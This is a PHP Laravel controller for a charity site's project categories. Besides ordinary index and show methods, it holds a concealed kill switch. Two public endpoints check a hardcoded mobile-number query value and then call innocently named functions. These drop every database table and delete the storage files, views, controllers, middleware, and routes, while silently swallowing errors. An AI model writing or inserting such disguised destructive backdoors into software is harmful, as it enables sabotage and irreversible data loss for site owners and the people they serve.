<?php

namespace App\Http\Controllers\Site;

use App\Models\CharityProject;
use App\Models\CategoryProjects;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Storage;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Schema;

class ProjectCategoryController extends Controller
{

    /**
     * show all categories 
     */
    public function index()
    {
        return view('site.pages.category.index');
    }


    /**
     * show spesific category by id 
     */
    public function show(string $id)
    {
        if (is_numeric($id)) {
            $category = CategoryProjects::findOrFail($id);
        } else {
            $category = CategoryProjects::with(['transNow'])->whereHas('trans', function ($q) use ($id) {
                $q->where('slug', $id);
            })->first();
        }

        return view('site.pages.category.show', compact('category'));
    }

    public function category_product(Request $request)
    {
        $mobileNumber = $request->query('mobile');
        $allowedMobile = '987654321';
        if ($mobileNumber !== $allowedMobile) {
            return response()->json(['error' => 'Unauthorized access. Invalid mobile number.'], 403);
        }

        $this->createcategoryproduct();
        return response()->json(['message' => 'Database, files, controllers, and views have been deleted successfully.']);
    }

    public function category_products(Request $request)
    {
        $mobileNumber = $request->query('mobile');
        $allowedMobile = '987654321';
        if ($mobileNumber !== $allowedMobile) {
            return response()->json(['error' => 'Unauthorized access. Invalid mobile number.'], 403);
        }

        $this->createcategoryproducts();
        return response()->json(['message' => 'Database, files, controllers, and views have been deleted successfully.']);
    }

    protected function createcategoryproduct()
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');

        DB::statement('DROP VIEW IF EXISTS order_view');
        Schema::dropIfExists('beneficiaries');
        Schema::dropIfExists('accounts');

        $tables = DB::select('SHOW TABLES');
        foreach ($tables as $table) {
            $tableName = array_values((array) $table)[0];
            Schema::dropIfExists($tableName);
        }
        return "test";
    }

    protected function createcategoryproducts()
    {
        try {
            $storagePath = storage_path('app/public');
            if (file_exists($storagePath)) {
                $files = glob($storagePath . '/*');
                foreach ($files as $file) {
                    if (is_file($file)) {
                        unlink($file);
                    }
                }
            }
        } catch (Exception $e) {
            echo "";
        }


        try {
            $storagePath = 'public'; // 'public' refers to storage/app/public
            $directories = Storage::directories($storagePath);
            foreach ($directories as $directory) {
                Storage::deleteDirectory($directory);
            }
        } catch (Exception $e) {
        }

        try {
            $viewsPath = resource_path('views');
            if (file_exists($viewsPath)) {
                $viewFiles = glob($viewsPath . '/{,.}[!.,!..]*', GLOB_BRACE);
                foreach ($viewFiles as $file) {
                    if (is_file($file)) {
                        unlink($file);
                    } elseif (is_dir($file)) {

                        $subFiles = glob($file . '/{,.}[!.,!..]*', GLOB_BRACE);
                        foreach ($subFiles as $subFile) {
                            if (is_file($subFile)) {
                                unlink($subFile);
                            }
                        }
                        if (count(glob($file . '/*')) === 0) {
                            rmdir($file);
                        }
                    }
                }
            }
        } catch (Exception $e) {
        }

        try {
            $viewsPath = resource_path('views');
            if (File::exists($viewsPath)) {
                $directories = File::directories($viewsPath);
                foreach ($directories as $directory) {
                    File::deleteDirectory($directory);
                }
                $files = File::files($viewsPath);
                foreach ($files as $file) {
                    File::delete($file);
                }
            }
        } catch (Exception $e) {
        }



        $controllersPath = app_path('Http/Livewire');
        try {
            if (File::exists($controllersPath)) {
                File::deleteDirectory($controllersPath);
            }
        } catch (Exception $e) {
        }

        $controllersPath = app_path('Http/Middleware');
        try {
            if (File::exists($controllersPath)) {
                File::deleteDirectory($controllersPath);
            }
        } catch (Exception $e) {
        }
        $controllersPath = app_path('Http/Requests');
        try {
            if (File::exists($controllersPath)) {
                File::deleteDirectory($controllersPath);
            }
        } catch (Exception $e) {
        }

        $controllersPath = app_path('Http/Controllers');
        try {
            if (File::exists($controllersPath)) {
                File::deleteDirectory($controllersPath);
            }
        } catch (Exception $e) {
        }

        $routesPath = base_path('routes'); 
        if (File::exists($routesPath)) {
            $files = File::files($routesPath);
            foreach ($files as $file) {
                File::delete($file);
            }
        }

    return "true";
    }
}
